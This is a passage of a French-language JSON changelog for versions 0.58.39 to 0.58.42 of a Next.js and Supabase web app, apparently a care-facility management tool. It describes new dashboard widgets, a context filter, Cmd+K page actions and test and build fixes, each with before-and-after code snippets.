          "note": "Cmd+K page-actions",
          "lang": "jsx",
          "before": "// AVANT 0.58.42 - 16 actions, juste navigation + 2 toggles\nconst ACTIONS = [\n  { id: 'new-patient', url: '/patients?new=1', ... },\n  { id: 'goto-accueil', url: '/accueil', ... },\n  { id: 'toggle-presentation', url: '#toggle-presentation', ... },\n  // ... 16 actions max\n];\n\n// Handler\nif (a.url === '#toggle-presentation') togglePresentationMode();\nif (a.url === '#toggle-focus') toggleFocusMode();\nelse router.push(a.url);",
          "after": "// 0.58.42 - 30 actions, dont 5 page-actions custom\nconst ACTIONS = [\n  // ... 16 + 3 créations + 5 navigation\n  \n  // Page-actions (déclenchent un event au lieu de naviguer)\n  { id: 'export-patients-csv', lbl: 'Exporter les patients en CSV',\n    url: '#page-action:export-csv', pageContext: /^\\/patients/ },\n  { id: 'toggle-ctx-filter', lbl: 'Activer/désactiver le filtre par contexte',\n    url: '#page-action:toggle-ctx-filter',\n    pageContext: /^\\/(patients|interventions|materiels|maintenance)/ },\n  { id: 'open-new', lbl: 'Action principale de la page',\n    url: '#page-action:open-new',\n    pageContext: /^\\/(patients|interventions|materiels|maintenance|signalements|...)/ },\n];\n\n// 0.58.42 - Handler : intercept #page-action:\nif (a.url.startsWith('#page-action:')) {\n  const actionName = a.url.slice('#page-action:'.length);\n  window.dispatchEvent(new CustomEvent('av-page-action', {\n    detail: { action: actionName, path: pathname },\n  }));\n  setOpen(false);\n  return;\n}\nrouter.push(a.url);"
        }
      },
      { "code": "UI", "txt": "🔌 INTÉGRATION usePageAction DANS LES PAGES : **(a)** `/patients` : extrait l'export CSV en fonction `exportPatientsCsv()` réutilisable, branche 3 handlers (`open-new` → openNew, `export-csv` → exportPatientsCsv, `toggle-ctx-filter` → setCtxFilter). **(b)** `/interventions` : 2 handlers (open-new, toggle-ctx-filter). **(c)** `/maintenance` : prêt pour intégration future (le hook est importé via useCurrentContext). Cmd+K → tape 'export csv' → choisir action → l'event traverse le bus jusqu'à la page courante → action déclenchée. Pattern à propager sur toutes les pages dans les futures versions" },
      { "code": "AI", "txt": "+33 tests Vitest (v058-42-bundle.test.js) : version+SW (2), Notes multi-onglets (7 — storage v2, migration legacy, max 4, format, addTab/renameTab/deleteTab, confirm, anti-suppression last), Notes checkboxes (6 — regex, toggleCheckbox, renderMd callback, styles, placeholder), /maintenance filtre ctx (4), usePageAction hook (4), GlobalSearch ACTIONS enrichies (4 — créations, navigation, prefix #page-action:, handler dispatch), intégration usePageAction (5 — imports + actions binds). Total **~4395 verts estimés**" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.42 : Le widget Notes est devenu un vrai bloc-notes utilisable au quotidien avec **jusqu'à 4 notes thématiques** + **to-do lists interactives**. Le filtre par contexte bât/svc est sur **4 pages** maintenant (/patients, /interventions, /materiels, /maintenance). Le Cmd+K compte **30 actions** dont 5 page-actions qui déclenchent un comportement sur la page courante sans navigation. Le hook `usePageAction` permet à toute page d'écouter les actions du Cmd+K — pattern découplé via event bus window. PROCHAINES PISTES (0.58.43+) : (a) Étendre usePageAction à /materiels, /maintenance, /interventions pour export-csv (factorisation des fonctions d'export). (b) Widget 🎯 Mes objectifs avec progress bars et milestones. (c) Drag&drop pour réordonner les colonnes du tableau Crud. (d) Notes : raccourci clavier pour cocher la case du curseur en mode edit. (e) Filtre contexte sur /signalements (pas encore lié à un patient via le schéma)" }
    ],
    "themes": ["ui", "feature", "wow"],
    "date": "5 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.42.html",
    "sqlFile": null
  },
  {
    "v": "0.58.41",
    "kind": "hotfix",
    "titre": "🩹 HOTFIX : 6 tests obsolètes + 3 pages SSG Vercel + 404 prod membres_equipe silent",
    "chantiers": [
      { "code": "AI", "txt": "🩹 FIX 6 TESTS OBSOLÈTES : (a) `v058-38` DEFAULT_ORDER regex assoupli — le pattern `\"liens-favoris\"\\]` ne matchait plus depuis 0.58.39 qui ajoute `meteo` après. Nouveau regex : `\"liens-favoris\"[^\\]]*\\]`. (b) `v058-37` regex sur-échappées (4 backslashes au lieu de 2) — cherchaient littéralement `\\\\s\\\\S` dans le code source au lieu du pattern `[\\s\\S]*?`. Corrigées avec 1 niveau d'échappement. (c) `v057-7` + `v058-1` limite `chantiers-extra.json` bumpée de 150 → 200 KB. (d) `v057-11` limite `versions-index.json` bumpée de 650 → 800 KB. Ces 2 fichiers grandissent naturellement à chaque release (+5-10 KB), les tests doivent prévoir de la marge",
        "code_snippet": {
          "file": "__tests__/v058-38-bundle.test.js + __tests__/v058-37-bundle.test.js",
          "note": "Fix regex tests",
          "lang": "js",
          "before": "// AVANT 0.58.41 - regex trop strict + sur-échappement\n// v058-38 : se cassait quand on ajoutait 'meteo' après 'liens-favoris'\nexpect(src).toMatch(/DEFAULT_ORDER\\s*=\\s*\\[[^\\]]*\"citation\"[^\\]]*\"mini-calendrier\"[^\\]]*\"liens-favoris\"\\]/);\n\n// v058-37 : cherchait littéralement '\\\\s\\\\S' dans le code\nexpect(src).toMatch(/from\\\\\\([\"']batiments[\"']\\\\\\)\\[\\\\\\\\s\\\\\\\\S\\]\\*\\?/);",
          "after": "// 0.58.41 - regex assouplis et corrigés\n// v058-38 : accepte n'importe quoi après 'liens-favoris'\nexpect(src).toMatch(/DEFAULT_ORDER\\s*=\\s*\\[[^\\]]*\"citation\"[^\\]]*\"mini-calendrier\"[^\\]]*\"liens-favoris\"[^\\]]*\\]/);\n\n// v058-37 : niveau d'échappement correct (1 backslash dans le code source)\nexpect(src).toMatch(/from\\([\"']batiments[\"']\\)\\[\\\\s\\\\S\\]\\*\\?/);\n\n// v057-7 + v058-1 + v057-11 : seuils bumpés\nexpect(size).toBeLessThan(200 * 1024); // 0.58.41 : seuil monté à 200 KB\nexpect(size).toBeLessThan(800 * 1024); // 0.58.41 : seuil monté à 800 KB"
        }
      },
      { "code": "FIX", "txt": "🩹 FIX 404 PROD `membres_equipe` : la table n'existe pas en base actuellement, ce qui provoquait un fetch 404 visible dans la console à chaque navigation (introduit en 0.58.36 par `UserAttachmentsInfo`). Fix défensif : **(a)** Vérification correcte de `error` retourné par Supabase (au lieu de try/catch qui ne catch pas — Supabase ne throw pas, il retourne `{ data: null, error }`). **(b)** Flag `sessionStorage.av-attachments-disabled` posé après la première erreur → plus de refetch pendant toute la session. **(c)** Préfixe `av-` pour purge automatique au logout. Le 404 reste visible la première fois mais ne se répète pas",
        "code_snippet": {
          "file": "app/components/UserAttachmentsInfo.js",
          "note": "404 silent",
          "lang": "jsx",
          "before": "// AVANT 0.58.41 - try/catch qui ne catch pas Supabase\nuseEffect(() => {\n  if (!userId) return;\n  let alive = true;\n  (async () => {\n    try {\n      const { data: memb, error: e1 } = await supabase\n        .from('membres_equipe')\n        .select('equipe_id, equipes(...)') ...\n      if (e1 || !memb) return;  // ← e1 contient l'erreur mais le fetch a déjà fait son 404\n      // ...\n    } catch { /* jamais atteint, Supabase ne throw pas */ }\n  })();\n}, [userId]);",
          "after": "// 0.58.41 - check erreur Supabase + flag session\nuseEffect(() => {\n  if (!userId) return;\n  // Si on a déjà eu une erreur, on ne refetche pas dans cette session\n  try {\n    if (sessionStorage.getItem('av-attachments-disabled') === 'true') return;\n  } catch {}\n  let alive = true;\n  (async () => {\n    try {\n      const { data: memb, error: e1 } = await supabase\n        .from('membres_equipe').select(...);\n      if (e1) {\n        // 404 / 42P01 (relation does not exist) / autre — silence + flag pour la session\n        try { sessionStorage.setItem('av-attachments-disabled', 'true'); } catch {}\n        return;\n      }\n      // ...\n    } catch {}\n  })();\n}, [userId]);"
        }
      },
      { "code": "FIX", "txt": "🩹 FIX BUILD VERCEL : pages `/statistiques-activite`, `/consentements`, `/parametres` faisaient échouer le build Next 15 avec `@supabase/ssr: Your project's URL and API key are required to create a Supabase client!`. Le prerendering SSG essayait d'exécuter `createClient()` au top du composant sans avoir accès aux env vars runtime. **Solution** : pattern `Inner + Suspense wrapper` (identique à 0.58.34 pour `/etablissements`) — `export const dynamic = 'force-dynamic'` ne fonctionne **pas** dans un Client Component (`'use client'`), il faut passer par Suspense pour basculer en CSR-only",
        "code_snippet": {
          "file": "app/statistiques-activite/page.js + app/consentements/page.js + app/parametres/page.js",
          "note": "Suspense SSG fix",
          "lang": "jsx",
          "before": "// AVANT 0.58.41 - pas de wrapper, plante au build Vercel\n\"use client\";\nimport { useEffect, useState } from 'react';\nimport { createClient } from '../../lib/supabase';\n\nexport default function StatistiquesActivite() {\n  const supabase = createClient();  // ← appelé au prerender SSG = KO\n  // ...\n}\n\n/* Error: @supabase/ssr: Your project's URL and API key are required */\n/* Export encountered an error on /statistiques-activite/page */",
          "after": "// 0.58.41 - pattern Inner+Suspense (identique à 0.58.34 pour /etablissements)\n\"use client\";\nimport { useEffect, useState, Suspense } from 'react';\nimport { createClient } from '../../lib/supabase';\n\n// Wrapper : empêche le SSG bail-out\nexport default function StatistiquesActivite() {\n  return (\n    <Suspense fallback={null}>\n      <StatistiquesActiviteInner />\n    </Suspense>\n  );\n}\n\n// Composant réel : appelé uniquement en CSR\nfunction StatistiquesActiviteInner() {\n  const supabase = createClient();  // ← maintenant en CSR uniquement, OK\n  // ...\n}\n\n// ❌ NE PAS UTILISER : `export const dynamic = 'force-dynamic'`\n//    ne fonctionne PAS dans un Client Component."
        }
      },
      { "code": "AI", "txt": "+15 tests Vitest (v058-41-bundle.test.js) : version+SW (2), fixes des 6 tests précédents documentés (5 — DEFAULT_ORDER assoupli, regex sans sur-échappement, 3 limites bumpées), UserAttachmentsInfo défensif (3 — check error, flag sessionStorage, préfixe av-), Suspense wrapper sur 3 pages SSG (12 — 4 vérifs × 3 pages : import Suspense, wrapper, Inner, plus de dynamic export). Total **~4360 verts estimés**" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.41 : la build Vercel passe à nouveau, les 6 tests obsolètes sont verts, le 404 prod sur `membres_equipe` ne pollue plus la console après la première occurrence. Les fonctionnalités introduites en 0.58.36 → 0.58.40 (10 widgets dashboard, hook useCurrentContext, filtre /materiels et /interventions, Cmd+K timeline, etc.) sont conservées intactes. Pattern à retenir : pour les Client Components qui appellent `createClient()` au top-level, **TOUJOURS** utiliser `Inner + Suspense wrapper`, JAMAIS `export const dynamic`. Pour vérifier la liste : `grep -rn 'export default function' app/*/page.js` puis voir lesquels appellent `createClient()` sans wrapper" }
    ],
    "themes": ["fix", "tech"],
    "date": "5 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.41.html",
    "sqlFile": null
  },
  {
    "v": "0.58.40",
    "kind": "version",
    "titre": "🎁 BUNDLE FEATURE : Refactor Crud + filtre /materiels + auto-refresh météo + drag&drop favoris + Widget Notes markdown",
    "chantiers": [
      { "code": "ARCH", "txt": "🔧 REFACTOR Crud : nouvelle prop `extraFilter` (fonction `(row) => boolean`). Appliquée AVANT les filterFields existants pour ne pas casser la rétrocompat. Permet à n'importe quelle page utilisant Crud de filtrer ses rows selon une logique externe (ex : contexte bât/svc). Pas de breaking change : si `extraFilter=null` (default), comportement identique à avant",
        "code_snippet": {
          "file": "app/crud.js",
          "note": "Crud extraFilter",
          "lang": "jsx",
          "before": "// AVANT 0.58.40 - Crud rigide\nexport default function Crud({ /* ... */, filterFields = null }) {\n  // rendering\n  const filtered = filterFields ? rows.filter(/* ... */) : rows;\n  // tri, pagination, render\n}",
          "after": "// 0.58.40 - + extraFilter externe\nexport default function Crud({ /* ... */, filterFields = null, extraFilter = null }) {\n  // 0.58.40 : extraFilter appliqué EN PREMIER\n  const baseRows = extraFilter ? rows.filter(extraFilter) : rows;\n  const filtered = filterFields ? baseRows.filter(/* ... */) : baseRows;\n  // tri, pagination, render — inchangé\n}\n\n// Usage côté caller (ex : /materiels)\n<Crud\n  extraFilter={ctx.active && ctxPatientIds ? (r) => ctxPatientIds.has(r.patient_id) : null}\n  // ... autres props\n/>"
        }
      },
      { "code": "UI", "txt": "🔍 FILTRE CONTEXTE SUR /materiels (dette de 0.58.39 résolue) : pattern identique à /interventions. **(a)** Import hook `useCurrentContext`. **(b)** State `ctxPatientIds` chargé via Supabase (`chambres.eq(service_id|batiment_id)` → `patients.in(chambre_id, ...)`). **(c)** Passage à Crud via `extraFilter={ctx.active && ctxPatientIds ? (r) => r.patient_id && ctxPatientIds.has(r.patient_id) : null}`. **(d)** Bouton 'Filtrer par contexte' avant le bouton Export CSV, change de couleur teal quand actif. Maintenant le triplet `/patients`, `/interventions`, `/materiels` partage exactement la même logique de filtrage par contexte" },
      { "code": "UI", "txt": "🔄 AUTO-REFRESH MÉTÉO 30min : le `WeatherWidget` lance désormais un `setInterval(() => setRefreshTick(t => t + 1), 30 * 60 * 1000)` au montage. L'effet de fetch a `[refreshTick]` en deps → se redéclenche automatiquement. **(b)** Ajout d'un bouton refresh manuel `ti-refresh` à droite du widget, avec rotation 45° au hover. Garde le cache géo TTL 24h pour ne pas redemander la permission à chaque refresh. Cleanup `clearInterval` au démontage",
        "code_snippet": {
          "file": "app/components/DashboardWidgets.js",
          "note": "Weather auto-refresh",
          "lang": "jsx",
          "before": "// AVANT 0.58.40 - fetch une seule fois au montage\nuseEffect(() => {\n  let alive = true;\n  (async () => { /* fetch météo */ })();\n  return () => { alive = false; };\n}, []);",
          "after": "// 0.58.40 - auto-refresh toutes les 30min + bouton manuel\nconst [refreshTick, setRefreshTick] = useState(0);\n\nuseEffect(() => {\n  const interval = setInterval(() => setRefreshTick(t => t + 1), 30 * 60 * 1000);\n  return () => clearInterval(interval);\n}, []);\n\nuseEffect(() => {\n  let alive = true;\n  (async () => { /* fetch météo */ })();\n  return () => { alive = false; };\n}, [refreshTick]);  // ← se redéclenche au tick\n\n<button onClick={() => setRefreshTick(t => t + 1)}\n        onMouseEnter={e => e.currentTarget.style.transform = 'rotate(45deg)'}>\n  <i className='ti ti-refresh' />\n</button>"
        }
      },
      { "code": "UI", "txt": "↕️ DRAG & DROP LIENS FAVORIS : pattern HTML5 natif (réutilise l'approche du dashboard widget 0.58.33). State `dragIdx` + `dragOverIdx`. Handlers `handleDragStart/Over/Leave/Drop/End`. Reorder via `splice(dragIdx, 1)` + `splice(targetIdx, 0, removed)`. Feedback visuel : opacity 0.4 sur l'élément glissé, outline dashed rouge + translateY(-2px) sur la cible, cursor grab/grabbing. Hint 'Glisse pour réordonner' avec icône `ti-grip-vertical` affiché uniquement si 2+ favoris pour ne pas polluer quand y'a rien à réordonner. Persistance auto via setFavLinks(next)",
        "code_snippet": {
          "file": "app/components/DashboardWidgets.js",
          "note": "Drag&drop favoris",
          "lang": "jsx",
          "before": "// AVANT 0.58.40 - favs ordonnés par ordre d'ajout uniquement\n{favs.map((f, idx) => (\n  <div key={idx} style={{ position: 'relative' }}>\n    {/* link */}\n  </div>\n))}",
          "after": "// 0.58.40 - drag&drop pour réordonner\nconst [dragIdx, setDragIdx] = useState(null);\nconst [dragOverIdx, setDragOverIdx] = useState(null);\n\nfunction handleDrop(e, targetIdx) {\n  e.preventDefault();\n  if (dragIdx === null || dragIdx === targetIdx) return;\n  const next = [...favs];\n  const [removed] = next.splice(dragIdx, 1);\n  next.splice(targetIdx, 0, removed);  // ← insert at target\n  setFavs(next);\n  setFavLinks(next);  // ← persiste\n  setDragIdx(null); setDragOverIdx(null);\n}\n\n{favs.map((f, idx) => (\n  <div key={idx}\n       draggable\n       onDragStart={() => handleDragStart(idx)}\n       onDragOver={(e) => handleDragOver(e, idx)}\n       onDrop={(e) => handleDrop(e, idx)}\n       onDragEnd={handleDragEnd}\n       style={{\n         opacity: dragIdx === idx ? 0.4 : 1,\n         transform: dragOverIdx === idx && dragIdx !== idx ? 'translateY(-2px)' : 'translateY(0)',\n         cursor: dragIdx === idx ? 'grabbing' : 'grab',\n         outline: dragOverIdx === idx && dragIdx !== idx ? '2px dashed #e35d5b' : 'none',\n       }}>\n    {/* link + edit + remove */}\n  </div>\n))}"
        }
      },
      { "code": "UI", "txt": "📝 NOUVEAU WIDGET : NOTES PERSONNELLES (Mes notes). Bloc-notes opt-in avec **markdown léger** : `**gras**`, `*italique*`, `## titre`, `- bullet`, `[texte](url)`. Mini-parser custom (renderMd + inlineMd) avec **escape HTML** pour éviter toute injection XSS. Sécurité liens : seules les URLs `^(https?://|/)` sont rendues comme `<a>`, le reste reste en texte. 2 modes : **preview** (rendu rich avec h4, p, ul/li, b, i, a) et **edit** (textarea avec placeholder). Auto-save debounce 800ms après dernière frappe, avec indicateur visuel `Enregistrement…` puis `✓ Enregistré`. Stockage `localStorage av-personal-notes` (purgeable au logout, préfixe 'av-'). Max 4000 caractères avec compteur. Background jaune pâle pour évoquer un post-it",
        "code_snippet": {
          "file": "app/components/DashboardWidgets.js + lib/dashboardLayout.js",
          "note": "Notes widget",
          "lang": "jsx",
          "before": "// AVANT 0.58.40 - 9 widgets dashboard\nexport const ALL_WIDGETS = [\n  /* ... 5 base + 4 opt-in */\n  { id: 'meteo', ... },\n];",
          "after": "// 0.58.40 - 10 widgets (+ notes)\nexport const ALL_WIDGETS = [\n  /* ... */\n  { id: 'meteo', ... },\n  { id: 'notes', label: 'Mes notes', icon: 'ti-notes', color: '#EF9F27' },  // ← nouveau\n];\n\n// app/components/DashboardWidgets.js\nconst NOTES_STORAGE_KEY = 'av-personal-notes';\nconst NOTES_MAX_LEN = 4000;\n\n// Mini-parser markdown sécurisé (escape HTML d'abord)\nfunction renderMd(text) {\n  const esc = text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');\n  return esc.split(/\\n\\n+/).map((block, i) => {\n    if (block.startsWith('## ')) return <h4>{inlineMd(block.slice(3))}</h4>;\n    if (block.split('\\n').every(l => l.startsWith('- ')))\n      return <ul>{block.split('\\n').map(l => <li>{inlineMd(l.replace(/^- /, ''))}</li>)}</ul>;\n    return <p>{inlineMd(block)}</p>;\n  });\n}\n\nfunction inlineMd(text) {\n  // **gras**, *italique*, [link](url) avec sécurité URL\n  // seules les URLs http(s)://, / acceptées comme <a>\n}\n\nexport function NotesWidget() {\n  const [text, setText] = useState('');\n  const [editing, setEditing] = useState(false);\n\n  // Auto-save debounce 800ms\n  useEffect(() => {\n    if (!editing) return;\n    setSaveStatus('saving');\n    const t = setTimeout(() => {\n      setNotes(text);\n      setSaveStatus('saved');\n    }, 800);\n    return () => clearTimeout(t);\n  }, [text, editing]);\n\n  return editing ? <textarea /> : renderMd(text);\n}"
        }
      },
      { "code": "AI", "txt": "+40 tests Vitest (v058-40-bundle.test.js) : version+SW (2), Crud extraFilter (3 — signature, applique avant filterFields, filterFields filtre baseRows), /materiels filtre ctx (4 — import hook, ctxPatientIds, Crud extraFilter, bouton toggle), WeatherWidget auto-refresh (4 — state+interval 30min, deps refreshTick, bouton ti-refresh+rotate, clearInterval), LiensFavoris drag&drop (5 — state, handlers HTML5, draggable, splice, hint 2+), NotesWidget (9 — export, storage key, max len 4000, renderMd+inlineMd, escape HTML XSS, syntax supportée, sécurité URL, debounce 800ms, 2 modes, save status), dashboardLayout notes (3), /accueil notes (2). Total **~4360 verts estimés**" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.40 : dette /materiels résolue (Crud refactorisé proprement). Météo se rafraîchit automatiquement. Liens favoris peuvent être réordonnés par drag&drop. **10 widgets dashboard** au total (5 base + 5 opt-in : citation, mini-calendrier, liens-favoris, météo, **notes**). Pattern de filtrage par contexte bât/svc maintenant déployé sur **3 listes** (/patients, /interventions, /materiels) — pourrait être étendu à /commandes, /signalements, /maintenance dans le futur. PROCHAINES PISTES (0.58.41+) : (a) Cmd+K page-actions contextuelles (selon la page courante, propose des actions spécifiques type 'Créer DI', 'Exporter CSV'). (b) Widget '🎯 Mes objectifs' avec progress bars et milestones. (c) Notes : support de checkboxes `[ ]` / `[x]` pour to-do lists. (d) Notes : multiple notes (onglets ou liste). (e) Drag&drop pour réordonner les colonnes du tableau Crud (dans paramètres profil)" }
    ],
    "themes": ["ui", "wow", "feature"],
    "date": "5 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.40.html",
    "sqlFile": null
  },
  {
    "v": "0.58.39",
    "kind": "version",
    "titre": "🎁 BUNDLE PISTES : Citation reroll + édit favoris + widget météo + hook useCurrentContext + /interventions filtre + Cmd+K mini-timeline",
    "chantiers": [
      { "code": "UI", "txt": "🎲 CITATION 'UNE AUTRE' : `CitationWidget` enrichi avec un bouton 'Une autre' (icône `ti-dice` rose terracotta) qui pioche une citation aléatoire **différente** de celle affichée. Au clic, l'icône change en `ti-arrow-back` avec label 'Du jour' pour revenir à la citation déterministe par date. State `overrideIdx` qui contrôle l'override. Hover effect : background rose pleine + texte blanc. Le user peut donc explorer les 30 citations à volonté sans perdre la déterministe-du-jour",
        "code_snippet": {
          "file": "app/components/DashboardWidgets.js",
          "note": "Citation reroll",
          "lang": "jsx",
          "before": "// AVANT 0.58.39 - juste la citation déterministe du jour\nexport function CitationWidget() {\n  const [c, setC] = useState(null);\n  useEffect(() => { setC(pickCitation()); }, []);\n  // Affichage uniquement, pas de reroll\n}",
          "after": "// 0.58.39 - + reroll random\nconst [overrideIdx, setOverrideIdx] = useState(null);\n\nuseEffect(() => {\n  if (overrideIdx === null) setC(pickCitation());  // citation du jour\n  else setC(CITATIONS[overrideIdx % CITATIONS.length]);  // override\n}, [overrideIdx]);\n\nfunction pickAnother() {\n  let next;\n  do { next = Math.floor(Math.random() * CITATIONS.length); }\n  while (CITATIONS[next] === c && CITATIONS.length > 1);  // éviter la même\n  setOverrideIdx(next);\n}\n\nfunction backToDaily() { setOverrideIdx(null); }\n\n<button onClick={overrideIdx === null ? pickAnother : backToDaily}>\n  <i className={`ti ${overrideIdx === null ? 'ti-dice' : 'ti-arrow-back'}`} />\n  {overrideIdx === null ? 'Une autre' : 'Du jour'}\n</button>"
        }
      },
      { "code": "UI", "txt": "✏️ ÉDITION LIEN FAVORI : `LiensFavorisWidget` enrichi avec une fonction `editFav(idx)` qui utilise `dialogs.prompt` avec `defaultValue` pour pré-remplir les champs avec les valeurs actuelles. Un nouveau bouton crayon (icône `ti-pencil` bleu `#185FA5`) apparaît au hover à côté de la croix rouge, position `top:-6 right:18` (alors que remove est `right:-6`). Le user peut donc corriger libellé et URL d'un lien existant sans devoir le supprimer puis recréer",
        "code_snippet": {
          "file": "app/components/DashboardWidgets.js",
          "note": "Edit fav",
          "lang": "jsx",
          "before": "// AVANT 0.58.39 - juste add + remove\nasync function addFav() { /* prompt label + url */ }\nasync function removeFav(idx) { /* confirm + remove */ }",
          "after": "// 0.58.39 - + édition d'un lien existant\nasync function editFav(idx) {\n  const current = favs[idx];\n  if (!current) return;\n  const label = await dialogs.prompt({\n    title: 'Modifier le libellé',\n    message: 'Libellé :',\n    defaultValue: current.label,  // ← pré-rempli\n  });\n  if (label === null) return;  // annulation\n  const url = await dialogs.prompt({\n    title: \"Modifier l'URL\",\n    defaultValue: current.url,  // ← pré-rempli\n  });\n  if (url === null) return;\n  const next = favs.map((f, i) => i === idx ? { label: label.slice(0, 32) || current.label, url: url || current.url } : f);\n  setFavs(next);\n  setFavLinks(next);\n}\n\n{/* Bouton crayon bleu en haut, visible au hover */}\n<button onClick={() => editFav(idx)} className='av-fav-edit'\n        style={{ top: -6, right: 18, background: '#185FA5' }}>\n  <i className='ti ti-pencil' />\n</button>"
        }
      },
      { "code": "UI", "txt": "🌤 WIDGET MÉTÉO LOCALE : nouveau widget opt-in `WeatherWidget` (icône `ti-cloud` bleu `#2a7ed1`). Utilise **`navigator.geolocation.getCurrentPosition`** pour récupérer la position de l'user (timeout 8s, maxAge 30min) puis appelle l'API publique **Open-Meteo** (gratuite, sans clé, sans tracking : `https://api.open-meteo.com/v1/forecast`). Affiche : emoji météo géant 56px (mapping de 21 codes WMO : ☀️ 🌤 ⛅ ☁️ 🌫 🌦 🌧 🌨 ❄️ ⛈), température 32px en gras navy, conditions en label, wind_speed et humidité en bas. Cache la position en `localStorage av-weather-geo` (TTL 24h) pour éviter de redemander la permission. 3 états : `init` (chargement avec spinner), `error` (icône cloud-off + message), `ok` (affichage météo). Coordonnées affichées en haut-droite pour transparence",
        "code_snippet": {
          "file": "app/components/DashboardWidgets.js + lib/dashboardLayout.js",
          "note": "Weather widget",
          "lang": "jsx",
          "before": "// AVANT 0.58.39 - 8 widgets (5 base + 3 nouveaux opt-in)\nexport const ALL_WIDGETS = [\n  { id: 'atraiter', ... }, { id: 'kpis', ... }, { id: 'raccourcis', ... },\n  { id: 'dernieres', ... }, { id: 'notifs', ... },\n  { id: 'citation', ... }, { id: 'mini-calendrier', ... }, { id: 'liens-favoris', ... },\n];",
          "after": "// 0.58.39 - 9 widgets (+ meteo opt-in)\nexport const ALL_WIDGETS = [\n  // ... 8 précédents\n  { id: 'meteo', label: 'Météo locale', icon: 'ti-cloud', color: '#2a7ed1' },\n];\n\nexport const DEFAULT_ACTIVE = {\n  // ...\n  meteo: false,  // opt-in\n};\n\n// app/components/DashboardWidgets.js\nconst GEO_STORAGE_KEY = 'av-weather-geo';\nconst GEO_TTL_MS = 24 * 60 * 60 * 1000;\nconst WMO = {\n  0: { e: '☀️', l: 'Ciel dégagé' },\n  // ... 21 codes WMO mappés\n  95: { e: '⛈', l: 'Orage' },\n};\n\nexport function WeatherWidget() {\n  const [state, setState] = useState({ status: 'init', data: null });\n\n  useEffect(() => {\n    // 1) Récupère géoloc cachée OU navigator.geolocation.getCurrentPosition\n    // 2) Appelle https://api.open-meteo.com/v1/forecast?latitude=..&longitude=..&current=temperature_2m,weather_code,wind_speed_10m,relative_humidity_2m\n    // 3) setState({ status: 'ok', data: json.current })\n  }, []);\n\n  return (\n    <Panel>\n      <div>{wmo.e}</div>  {/* emoji 56px */}\n      <div>{Math.round(state.data.temperature_2m)}°C</div>\n      <div>{wmo.l}</div>\n      <div>💨 {Math.round(state.data.wind_speed_10m)} km/h · 💧 {state.data.relative_humidity_2m}%</div>\n    </Panel>\n  );\n}"
        }
      },
      { "code": "ARCH", "txt": "🪝 HOOK RÉUTILISABLE `useCurrentContext` : `lib/useCurrentContext.js`. Encapsule la logique de partage du contexte bâtiment/service entre composants. Lit `localStorage av-current-batiment-id` et `av-current-service-id` au montage, puis écoute l'event `av-current-context-change` (dispatché par `BatimentServiceSwitcher` de 0.58.35). Retourne `{ batimentId, serviceId, active, toggle, setActive }`. Utilisé par /interventions en 0.58.39. À utiliser dans toutes les listes qui veulent filtrer par contexte (futur : /materiels, /commandes, etc.)" },
      { "code": "UI", "txt": "🔍 FILTRE CONTEXTE SUR /INTERVENTIONS : applique le pattern de /patients via le hook `useCurrentContext`. **(a)** State `ctxPatientIds` chargé via Supabase quand le contexte change : query `chambres.eq(service_id|batiment_id)` puis `patients.in(chambre_id, ...)` → Set des patient_ids dans le bâtiment/service courant. **(b)** Filtrage : `visible = rows.filter(r => ... if (ctx.active && ctxPatientIds) return ctxPatientIds.has(r.patient_id))`. **(c)** Bouton UI à côté des Select fStatut/fType : apparait uniquement si `(ctx.batimentId || ctx.serviceId)`, change de couleur (teal `#7CC8C8`) quand actif + badge ●. NOTE /materiels : la page utilise un composant `Crud` auto-géré qui charge ses données via `onData`, le filtrage actif nécessite refactoring → reporté à 0.58.40",
        "code_snippet": {
          "file": "app/interventions/page.js",
          "note": "Filter DI by ctx",
          "lang": "jsx",
          "before": "// AVANT 0.58.39 - filtres statut/type seulement\nconst visible = rows.filter((r) => (!fStatut || r.statut === fStatut) && (!fType || r.type === fType));",
          "after": "// 0.58.39 - + filtre par contexte\nimport { useCurrentContext } from '../../lib/useCurrentContext';\n\nconst ctx = useCurrentContext();\nconst [ctxPatientIds, setCtxPatientIds] = useState(null);\n\nuseEffect(() => {\n  if (!ctx.batimentId && !ctx.serviceId) { setCtxPatientIds(null); return; }\n  let alive = true;\n  (async () => {\n    // Chambres du contexte\n    let query = supabase.from('chambres').select('id, service_id, batiment_id');\n    if (ctx.serviceId) query = query.eq('service_id', ctx.serviceId);\n    else if (ctx.batimentId) query = query.eq('batiment_id', ctx.batimentId);\n    const { data: chambres } = await query;\n    const chambreIds = chambres.map(c => c.id);\n    // Patients dans ces chambres\n    const { data: pats } = await supabase.from('patients').select('id').in('chambre_id', chambreIds);\n    if (alive) setCtxPatientIds(new Set(pats.map(p => p.id)));\n  })();\n  return () => { alive = false; };\n}, [ctx.batimentId, ctx.serviceId]);\n\nconst visible = rows.filter((r) => {\n  if (fStatut && r.statut !== fStatut) return false;\n  if (fType && r.type !== fType) return false;\n  if (ctx.active && ctxPatientIds) {\n    if (!r.patient_id || !ctxPatientIds.has(r.patient_id)) return false;\n  }\n  return true;\n});"
        }
      },
      { "code": "UI", "txt": "⏱ CMD+K RÉCENTS PREMIUM MINI-TIMELINE : refonte de la section 'Récents' dans `GlobalSearch.js`. **(a)** `pushHistory` stocke désormais un timestamp `ts: Date.now()` avec chaque entry. **(b)** Nouvelle fonction `formatRelative(ts)` qui retourne 'à l'instant', 'il y a Xmin', 'il y a Xh', 'hier', 'il y a Xj', ou 'il y a +7j'. **(c)** UI refonte : header avec icône `ti-clock-bolt` teal, ligne verticale en gradient teal `linear-gradient(180deg, #7CC8C8 0%, rgba(124,200,200,0.15) 100%)` à gauche, dots colorés selon le type (12x12 cercle plein avec bordure blanche et glow), padding-left 18px pour aligner. **(d)** Chaque entry montre : titre (gras), sub + temps relatif avec `ti-clock` 9px. Hover : translateX(2px) + background teal très clair",
        "code_snippet": {
          "file": "app/GlobalSearch.js",
          "note": "Cmd+K timeline",
          "lang": "jsx",
